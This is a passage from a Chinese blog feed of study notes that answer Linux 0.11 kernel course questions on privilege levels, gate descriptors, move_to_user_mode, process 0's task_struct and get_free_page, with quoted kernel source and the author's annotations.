class=\"comment\">//设置系统调用门函数</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> set_system_gate(n,addr) \\</span></span><br><span class=\"line\"><span class=\"meta\">\t_set_gate(&amp;idt[n],15,3,addr)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _set_gate(gate_addr,type,dpl,addr) \\</span></span><br><span class=\"line\"><span class=\"meta\">__asm__ (<span class=\"string\">&quot;movw %%dx,%%ax\\n\\t&quot;</span> \\ <span class=\"comment\">//实现了偏移的拆分</span></span></span><br><span class=\"line\">\t<span class=\"string\">&quot;movw %0,%%dx\\n\\t&quot;</span> \\        <span class=\"comment\">//将偏移的低字给dx</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;movl %%eax,%1\\n\\t&quot;</span> \\         </span><br><span class=\"line\">\t<span class=\"string\">&quot;movl %%edx,%2&quot;</span> \\            <span class=\"comment\">//差四字节</span></span><br><span class=\"line\">\t: \\</span><br><span class=\"line\">\t: <span class=\"string\">&quot;i&quot;</span> ((<span class=\"type\">short</span>) (<span class=\"number\">0x8000</span>+(dpl&lt;&lt;<span class=\"number\">13</span>)+(type&lt;&lt;<span class=\"number\">8</span>))), \\</span><br><span class=\"line\">\t<span class=\"string\">&quot;o&quot;</span> (*((<span class=\"type\">char</span> *) (gate_addr))), \\</span><br><span class=\"line\">\t<span class=\"string\">&quot;o&quot;</span> (*(<span class=\"number\">4</span>+(<span class=\"type\">char</span> *) (gate_addr))), \\</span><br><span class=\"line\">\t<span class=\"string\">&quot;d&quot;</span> ((<span class=\"type\">char</span> *) (addr)),<span class=\"string\">&quot;a&quot;</span> (<span class=\"number\">0x00080000</span>))  <span class=\"comment\">// jump 08》???</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"13-在IA-32中，有大约20多个指令是只能在0特权级下使用，其他的指令，比如cli，并没有这个约定。奇怪的是，在Linux0-11中，3特权级的进程代码并不能使用cli指令，这是为什么？请解释并给出代码证据。\"><a href=\"#13-在IA-32中，有大约20多个指令是只能在0特权级下使用，其他的指令，比如cli，并没有这个约定。奇怪的是，在Linux0-11中，3特权级的进程代码并不能使用cli指令，这是为什么？请解释并给出代码证据。\" class=\"headerlink\" title=\"13.在IA-32中，有大约20多个指令是只能在0特权级下使用，其他的指令，比如cli，并没有这个约定。奇怪的是，在Linux0.11中，3特权级的进程代码并不能使用cli指令，这是为什么？请解释并给出代码证据。\"></a>13.在IA-32中，有大约20多个指令是只能在0特权级下使用，其他的指令，比如cli，并没有这个约定。奇怪的是，在Linux0.11中，3特权级的进程代码并不能使用cli指令，这是为什么？请解释并给出代码证据。</h1><h2 id=\"原因解释\"><a href=\"#原因解释\" class=\"headerlink\" title=\"原因解释:\"></a>原因解释:</h2><pre><code>    这个东西和特权级有关(废话),这个是intel的规定,cli和sti与CPL和EFLAGS[IOPL]相关,通过EFLAGS中的IOOPL来保护一些敏感io指令,如cli、sti、in、out等,只有当CPL≤IOPL时才能执行,也就是说当前特权级大于IOPL设置的特权级才可以执行、否则会产生一个一般性保护异常\n\n    IOPL位于EFLAGS的12-13位,只能通过iret改变,linux0.11的0进程,INIT_TASK中IOPL为0,在move_to_user_mode中执行了pushfl\\n\\t,继承了内核的EFLAGS,所以用户态的3特权级大于IOPL的0特权级,无法调用cli\n</code></pre>\n<h2 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码:\"></a>代码:</h2><h3 id=\"move-to-user-mode\"><a href=\"#move-to-user-mode\" class=\"headerlink\" title=\"move_to_user_mode\"></a>move_to_user_mode</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> move_to_user_mode() \\</span></span><br><span class=\"line\"><span class=\"meta\">__asm__ (<span class=\"string\">&quot;movl %%esp,%%eax\\n\\t&quot;</span> \\</span></span><br><span class=\"line\"><span class=\"meta\">\t<span class=\"string\">&quot;pushfl\\n\\t&quot;</span> \\</span></span><br><span class=\"line\"><span class=\"meta\">....</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;iret\\n&quot;</span> \\ </span><br><span class=\"line\">....</span><br><span class=\"line\">\t:::<span class=\"string\">&quot;ax&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"INIT-TASK-include-x2F-linux-x2F-sched-h\"><a href=\"#INIT-TASK-include-x2F-linux-x2F-sched-h\" class=\"headerlink\" title=\"INIT_TASK include&#x2F;linux&#x2F;sched.h\"></a>INIT_TASK include&#x2F;linux&#x2F;sched.h</h3><p>tss的第10位为0,可以在该文件下找到tss的结构,第10位就是eflags</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> INIT_TASK \\</span></span><br><span class=\"line\"><span class=\"meta\">...</span></span><br><span class=\"line\"><span class=\"comment\">/*tss*/</span>\t&#123;<span class=\"number\">0</span>,PAGE_SIZE+(<span class=\"type\">long</span>)&amp;init_task,<span class=\"number\">0x10</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,(<span class=\"type\">long</span>)&amp;pg_dir,\\</span><br><span class=\"line\">\t <span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>, \\</span><br><span class=\"line\">\t <span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0x17</span>,<span class=\"number\">0x17</span>,<span class=\"number\">0x17</span>,<span class=\"number\">0x17</span>,<span class=\"number\">0x17</span>,<span class=\"number\">0x17</span>, \\</span><br><span class=\"line\">\t _LDT(<span class=\"number\">0</span>),<span class=\"number\">0x80000000</span>, \\</span><br><span class=\"line\">\t\t&#123;&#125; \\</span><br><span class=\"line\">\t&#125;, \\</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tss_struct</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"type\">long</span>\tback_link;\t<span class=\"comment\">/* 16 high bits zero */</span></span><br><span class=\"line\">\t<span class=\"type\">long</span>\tesp0;</span><br><span class=\"line\">\t<span class=\"type\">long</span>\tss0;\t\t<span class=\"comment\">/* 16 high bits zero */</span></span><br><span class=\"line\">\t<span class=\"type\">long</span>\tesp1;</span><br><span class=\"line\">\t<span class=\"type\">long</span>\tss1;\t\t<span class=\"comment\">/* 16 high bits zero */</span></span><br><span class=\"line\">\t<span class=\"type\">long</span>\tesp2;</span><br><span class=\"line\">\t<span class=\"type\">long</span>\tss2;\t\t<span class=\"comment\">/* 16 high bits zero */</span></span><br><span class=\"line\">\t<span class=\"type\">long</span>\tcr3;</span><br><span class=\"line\">\t<span class=\"type\">long</span>\teip;</span><br><span class=\"line\">\t<span class=\"type\">long</span>\teflags;</span><br><span class=\"line\">\t<span class=\"type\">long</span>\teax,ecx,edx,ebx;</span><br><span class=\"line\">\t<span class=\"type\">long</span>\tesp;</span><br><span class=\"line\">\t<span class=\"type\">long</span>\tebp;</span><br><span class=\"line\">\t<span class=\"type\">long</span>\tesi;</span><br><span class=\"line\">\t<span class=\"type\">long</span>\tedi;</span><br><span class=\"line\">\t<span class=\"type\">long</span>\tes;\t\t<span class=\"comment\">/* 16 high bits zero */</span></span><br><span class=\"line\">\t<span class=\"type\">long</span>\tcs;\t\t<span class=\"comment\">/* 16 high bits zero */</span></span><br><span class=\"line\">\t<span class=\"type\">long</span>\tss;\t\t<span class=\"comment\">/* 16 high bits zero */</span></span><br><span class=\"line\">\t<span class=\"type\">long</span>\tds;\t\t<span class=\"comment\">/* 16 high bits zero */</span></span><br><span class=\"line\">\t<span class=\"type\">long</span>\tfs;\t\t<span class=\"comment\">/* 16 high bits zero */</span></span><br><span class=\"line\">\t<span class=\"type\">long</span>\tgs;\t\t<span class=\"comment\">/* 16 high bits zero */</span></span><br><span class=\"line\">\t<span class=\"type\">long</span>\tldt;\t\t<span class=\"comment\">/* 16 high bits zero */</span></span><br><span class=\"line\">\t<span class=\"type\">long</span>\ttrace_bitmap;\t<span class=\"comment\">/* bits: trace 0, bitmap 16-31 */</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">i387_struct</span> <span class=\"title\">i387</span>;</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"14-进程0的task-struct在哪？具体内容是什么？给出代码证据。\"><a href=\"#14-进程0的task-struct在哪？具体内容是什么？给出代码证据。\" class=\"headerlink\" title=\"14.进程0的task_struct在哪？具体内容是什么？给出代码证据。\"></a>14.进程0的task_struct在哪？具体内容是什么？给出代码证据。</h1><p>init&#x2F;main.c sched_init();</p>\n<p>kernel&#x2F;sched.c </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">sched_init</span><span class=\"params\">(<span class=\"type\">void</span>)</span> <span class=\"comment\">//调度程序的初始化子程序 </span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> i;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">desc_struct</span> * <span class=\"title\">p</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> sigaction) != <span class=\"number\">16</span>)</span><br><span class=\"line\">\t\tpanic(<span class=\"string\">&quot;Struct sigaction MUST be 16 bytes&quot;</span>);  <span class=\"comment\">//致命错误</span></span><br><span class=\"line\">\tset_tss_desc(gdt+FIRST_TSS_ENTRY,&amp;(init_task.task.tss)); <span class=\"comment\">// 设置初始任务（任务 0）的任务状态段描述符和局部数据表描述符(include/asm/system.h,65)。</span></span><br><span class=\"line\">\tset_ldt_desc(gdt+FIRST_LDT_ENTRY,&amp;(init_task.task.ldt));</span><br><span class=\"line\"></span><br><span class=\"line\">init_task</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"class\"><span class=\"keyword\">union</span> <span class=\"title\">task_union</span> <span class=\"title\">init_task</span> =</span> &#123;INIT_TASK,&#125;; <span class=\"comment\">// 这里进行类型转换</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"15-在system-h里读懂代码。这里中断门、陷阱门、系统调用都是通过-set-gate设置的，用的是同一个嵌入汇编代码，比较明显的差别是dpl一个是3，另外两个是0，这是为什么？说明理由。\"><a href=\"#15-在system-h里读懂代码。这里中断门、陷阱门、系统调用都是通过-set-gate设置的，用的是同一个嵌入汇编代码，比较明显的差别是dpl一个是3，另外两个是0，这是为什么？说明理由。\" class=\"headerlink\" title=\"15.在system.h里读懂代码。这里中断门、陷阱门、系统调用都是通过_set_gate设置的，用的是同一个嵌入汇编代码，比较明显的差别是dpl一个是3，另外两个是0，这是为什么？说明理由。\"></a>15.在system.h里读懂代码。这里中断门、陷阱门、系统调用都是通过_set_gate设置的，用的是同一个嵌入汇编代码，比较明显的差别是dpl一个是3，另外两个是0，这是为什么？说明理由。</h1><p>p51</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _set_gate(gate_addr,type,dpl,addr) \\</span></span><br><span class=\"line\"><span class=\"meta\">__asm__ (<span class=\"string\">&quot;movw %%dx,%%ax\\n\\t&quot;</span> \\ <span class=\"comment\">//实现了偏移的拆分</span></span></span><br><span class=\"line\">\t<span class=\"string\">&quot;movw %0,%%dx\\n\\t&quot;</span> \\        <span class=\"comment\">//将偏移的低字给dx</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;movl %%eax,%1\\n\\t&quot;</span> \\         </span><br><span class=\"line\">\t<span class=\"string\">&quot;movl %%edx,%2&quot;</span> \\            <span class=\"comment\">//差四字节</span></span><br><span class=\"line\">\t: \\</span><br><span class=\"line\">\t: <span class=\"string\">&quot;i&quot;</span> ((<span class=\"type\">short</span>) (<span class=\"number\">0x8000</span>+(dpl&lt;&lt;<span class=\"number\">13</span>)+(type&lt;&lt;<span class=\"number\">8</span>))), \\</span><br><span class=\"line\">\t<span class=\"string\">&quot;o&quot;</span> (*((<span class=\"type\">char</span> *) (gate_addr))), \\</span><br><span class=\"line\">\t<span class=\"string\">&quot;o&quot;</span> (*(<span class=\"number\">4</span>+(<span class=\"type\">char</span> *) (gate_addr))), \\</span><br><span class=\"line\">\t<span class=\"string\">&quot;d&quot;</span> ((<span class=\"type\">char</span> *) (addr)),<span class=\"string\">&quot;a&quot;</span> (<span class=\"number\">0x00080000</span>))  <span class=\"comment\">// jump 08》???</span></span><br><span class=\"line\"><span class=\"comment\">//设置中断门函数</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> set_intr_gate(n,addr) \\  <span class=\"comment\">// n 中断号 addr 中断程序偏移地址</span></span></span><br><span class=\"line\">\t_set_gate(&amp;idt[n],<span class=\"number\">14</span>,<span class=\"number\">0</span>,addr)  <span class=\"comment\">//&amp;idt[n]对应中断号在中断描述符表中的偏移值；中断描述符的类型是 14，特权级是 0。</span></span><br><span class=\"line\"><span class=\"comment\">//设置陷阱门函数</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> set_trap_gate(n,addr) \\</span></span><br><span class=\"line\"><span class=\"meta\">\t_set_gate(&amp;idt[n],15,0,addr) <span class=\"comment\">// idt表的n项,f,0, 0对应dpl,15对应type ,以二进制来看到</span></span></span><br><span class=\"line\"><span class=\"comment\">//设置系统调用门函数</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> set_system_gate(n,addr) \\</span></span><br><span class=\"line\"><span class=\"meta\">\t_set_gate(&amp;idt[n],15,3,addr)</span></span><br></pre></td></tr></table></figure>\n\n<p>这里也是特权级保护的思想, 大概申请者用于大于该东西的特权级才能访问(具体的比这个复杂, 参加IA32 第三卷)</p>\n<p>set_system_gate是3,意思是系统调用可以由3特权级(即用户特权级)进行调用,其余两个为0的意思是只能由内核处理,禁止用户进程进行调用,这样就起到了保护系统的作用</p>\n<h1 id=\"16-进程0-fork进程1之前，为什么先调用move-to-user-mode-？用的是什么方法？解释其中的道理。\"><a href=\"#16-进程0-fork进程1之前，为什么先调用move-to-user-mode-？用的是什么方法？解释其中的道理。\" class=\"headerlink\" title=\"16.进程0 fork进程1之前，为什么先调用move_to_user_mode()？用的是什么方法？解释其中的道理。\"></a>16.进程0 fork进程1之前，为什么先调用move_to_user_mode()？用的是什么方法？解释其中的道理。</h1><p>p78 </p>\n<h2 id=\"为什么要调用move-to-user-mode\"><a href=\"#为什么要调用move-to-user-mode\" class=\"headerlink\" title=\"为什么要调用move_to_user_mode()?\"></a>为什么要调用move_to_user_mode()?</h2><pre><code>    因为Linux操作系统规定,除了进程0之外,所有进程都要由一个已有进程在3特权级下进行创建,所以进程0在fork进程1之前,要先从0特权级翻转到3特权级\n</code></pre>\n<p>Linux0.11是通过move_to_user_mode(),模仿中断返回动作,实现从0特权级转变为3特权级  </p>\n<h2 id=\"方法-怎么实现翻转呢\"><a href=\"#方法-怎么实现翻转呢\" class=\"headerlink\" title=\"方法(怎么实现翻转呢?\"></a>方法(怎么实现翻转呢?</h2><pre><code>    IA32体系结构翻转特权级的方法之一是中断,进入中断的时候由3转0,返回的时候由0转3. int指令会引发CPU硬件完成SS、ESP、EFLAGS、CS、EIP的值按顺序进栈,返回时CPU执行iret指令会将栈中的值自动按反序恢复给这五个寄存器\n\n    既然要模拟中断返回,那么就需要模拟int(中断)时的压栈,就是前面5个push,最后调用iret进行返回,将SS,ESP,EFLAGS,CS,EIP按顺序交给CPU,CPU此时就翻转到了3特权级(具体的呢??)\n</code></pre>\n<h2 id=\"代码-1\"><a href=\"#代码-1\" class=\"headerlink\" title=\"代码\"></a>代码</h2><p>include&#x2F;asm&#x2F;system.h</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> move_to_user_mode() \\</span></span><br><span class=\"line\"><span class=\"meta\">__asm__ (<span class=\"string\">&quot;movl %%esp,%%eax\\n\\t&quot;</span> \\</span></span><br><span class=\"line\"><span class=\"meta\">\t<span class=\"string\">&quot;pushl $0x17\\n\\t&quot;</span> \\  <span class=\"comment\">//SS 0x17 =  10(第三项)1(ldt)11(特权级3 )  代替inc int? 这是个段值,用户程序数据段   由0特权变为3特权 </span></span></span><br><span class=\"line\">\t<span class=\"string\">&quot;pushl %%eax\\n\\t&quot;</span> \\ <span class=\"comment\">//里面就是esp    对的,看第一句</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;pushfl\\n\\t&quot;</span> \\</span><br><span class=\"line\">\t<span class=\"string\">&quot;pushl $0x0f\\n\\t&quot;</span> \\ <span class=\"comment\">// 0000000000001111 最后两位11(特权级3)</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;pushl $1f\\n\\t&quot;</span> \\ </span><br><span class=\"line\">\t<span class=\"string\">&quot;iret\\n&quot;</span> \\ <span class=\"comment\">// 中断返回 (与中断不配套其实,单独出现的一个返回,前面是一个模拟中断)</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;1:\\tmovl $0x17,%%eax\\n\\t&quot;</span> \\   <span class=\"comment\">//开始3特权级  切3态的话  为什么说切到task0了? ldtr tr-&gt;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;movw %%ax,%%ds\\n\\t&quot;</span> \\         <span class=\"comment\">// 进程0代码      分页的时候 + 7、 task数组,都可以说明是进程0</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;movw %%ax,%%es\\n\\t&quot;</span> \\</span><br><span class=\"line\">\t<span class=\"string\">&quot;movw %%ax,%%fs\\n\\t&quot;</span> \\</span><br><span class=\"line\">\t<span class=\"string\">&quot;movw %%ax,%%gs&quot;</span> \\</span><br><span class=\"line\">\t:::<span class=\"string\">&quot;ax&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"17-在Linux操作系统中大量使用了中断、异常类的处理，究竟有什么好处？\"><a href=\"#17-在Linux操作系统中大量使用了中断、异常类的处理，究竟有什么好处？\" class=\"headerlink\" title=\"17.在Linux操作系统中大量使用了中断、异常类的处理，究竟有什么好处？\"></a>17.在Linux操作系统中大量使用了中断、异常类的处理，究竟有什么好处？</h1><pre><code>    在此之前是采用“主动轮巡”的方式来处理这些请求,在轮巡的时候干不了别的,很浪费时间. 所以不如采用被动的模式,即当有需要的时候,发送中断信号,告诉CPU进入到具体的中断处理程序进行处理. 这样使得CPU的处理更加高效.\n</code></pre>\n<h1 id=\"18-copy-process函数的参数最后五项是：long-eip-long-cs-long-eflags-long-esp-long-ss。查看栈结构确实有这五个参数，奇怪的是其他参数的压栈代码都能找得到，确找不到这五个参数的压栈代码，反汇编代码中也查不到，请解释原因。\"><a href=\"#18-copy-process函数的参数最后五项是：long-eip-long-cs-long-eflags-long-esp-long-ss。查看栈结构确实有这五个参数，奇怪的是其他参数的压栈代码都能找得到，确找不到这五个参数的压栈代码，反汇编代码中也查不到，请解释原因。\" class=\"headerlink\" title=\"18.copy_process函数的参数最后五项是：long eip,long cs,long eflags,long esp,long ss。查看栈结构确实有这五个参数，奇怪的是其他参数的压栈代码都能找得到，确找不到这五个参数的压栈代码，反汇编代码中也查不到，请解释原因。\"></a>18.copy_process函数的参数最后五项是：long eip,long cs,long eflags,long esp,long ss。查看栈结构确实有这五个参数，奇怪的是其他参数的压栈代码都能找得到，确找不到这五个参数的压栈代码，反汇编代码中也查不到，请解释原因。</h1><p>p83</p>\n<p>是在int 0x80的时候,CPU硬件自动将ss、esp、eflags、cs、eip进行压栈(压入进程0的内核栈), (本意是保护存储压栈现场,使得中断返回后能够继续正常执行,在这里我们灵活取用了)</p>\n<p>init&#x2F;main.c </p>\n<h1 id=\"19-分析get-free-page-函数的代码，叙述在主内存中获取一个空闲页的技术路线。\"><a href=\"#19-分析get-free-page-函数的代码，叙述在主内存中获取一个空闲页的技术路线。\" class=\"headerlink\" title=\"19.分析get_free_page()函数的代码，叙述在主内存中获取一个空闲页的技术路线。\"></a>19.分析get_free_page()函数的代码，叙述在主内存中获取一个空闲页的技术路线。</h1><p>p89</p>\n<p>赵炯p446</p>\n<p>kernel&#x2F;fork.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">copy_process</span><span class=\"params\">(<span class=\"type\">int</span> nr,<span class=\"type\">long</span> ebp,<span class=\"type\">long</span> edi,<span class=\"type\">long</span> esi,<span class=\"type\">long</span> gs,<span class=\"type\">long</span> none, <span class=\"comment\">//none是</span></span></span><br><span class=\"line\"><span class=\"params\">\t\t<span class=\"type\">long</span> ebx,<span class=\"type\">long</span> ecx,<span class=\"type\">long</span> edx,</span></span><br><span class=\"line\"><span class=\"params\">\t\t<span class=\"type\">long</span> fs,<span class=\"type\">long</span> es,<span class=\"type\">long</span> ds,</span></span><br><span class=\"line\"><span class=\"params\">\t\t<span class=\"type\">long</span> eip,<span class=\"type\">long</span> cs,<span class=\"type\">long</span> eflags,<span class=\"type\">long</span> esp,<span class=\"type\">long</span> ss)</span> <span class=\"comment\">//int 0x80 ss esp啥呀这是</span></span><br><span class=\"line\">&#123; <span class=\"comment\">//参数哪来的呢?? 传参了吗? 压栈放在栈里了, 主调函数往里放 在哪传的?</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">task_struct</span> *<span class=\"title\">p</span>;</span> </span><br><span class=\"line\">\t<span class=\"type\">int</span> i;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">file</span> *<span class=\"title\">f</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tp = (<span class=\"keyword\">struct</span> task_struct *) get_free_page(); <span class=\"comment\">//返回的指针做强制类型转换,把一块空间转换成一个struct</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!p)</span><br></pre></td></tr></table></figure>\n\n<p>mm&#x2F;memory.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * Get physical address of first (actually last :-) free page, and mark it</span></span><br><span class=\"line\"><span class=\"comment\"> * used. If no free pages left, return 0.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"title function_\">get_free_page</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">register</span> <span class=\"type\">unsigned</span> <span class=\"type\">long</span> __res <span class=\"title function_\">asm</span><span class=\"params\">(<span class=\"string\">&quot;ax&quot;</span>)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">__asm__(<span class=\"string\">&quot;std ; repne ; scasb\\n\\t&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;jne 1f\\n\\t&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;movb $1,1(%%edi)\\n\\t&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;sall $12,%%ecx\\n\\t&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;addl %2,%%ecx\\n\\t&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;movl %%ecx,%%edx\\n\\t&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;movl $1024,%%ecx\\n\\t&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;leal 4092(%%edx),%%edi\\n\\t&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;rep ; stosl\\n\\t&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;movl %%edx,%%eax\\n&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;1:&quot;</span></span><br><span class=\"line\">\t:<span class=\"string\">&quot;=a&quot;</span> (__res)</span><br><span class=\"line\">\t:<span class=\"string\">&quot;0&quot;</span> (<span class=\"number\">0</span>),<span class=\"string\">&quot;i&quot;</span> (LOW_MEM),<span class=\"string\">&quot;c&quot;</span> (PAGING_PAGES),</span><br><span class=\"line\">\t<span class=\"string\">&quot;D&quot;</span> (mem_map+PAGING_PAGES<span class=\"number\">-1</span>)</span><br><span class=\"line\">\t:<span class=\"string\">&quot;di&quot;</span>,<span class=\"string\">&quot;cx&quot;</span>,<span class=\"string\">&quot;dx&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">return</span> __res;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"20-分析copy-page-tables（）函数的代码，叙述父进程如何为子进程复制页表。\"><a href=\"#20-分析copy-page-tables（）函数的代码，叙述父进程如何为子进程复制页表。\" class=\"headerlink\" title=\"20.分析copy_page_tables（）函数的代码，叙述父进程如何为子进程复制页表。\"></a>20.分析copy_page_tables（）函数的代码，叙述父进程如何为子进程复制页表。</h1><p>p97</p>\n<h1 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h1><p>《Linux内核设计的艺术 第二版》 新设计团队</p>\n<p>《Linux内核完全注释》 赵炯</p>\n<p>《IA32》 手册 第三卷</p>\n<p><a href=\"https://www.likecs.com/show-204742912.html\">https://www.likecs.com/show-204742912.html</a></p>\n<p><a href=\"https://github.com/sunym1993/flash-linux0.11-talk\">https://github.com/sunym1993/flash-linux0.11-talk</a></p>\n",
            "tags": [
                "研究生课程"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-2-ret2shellcode/",
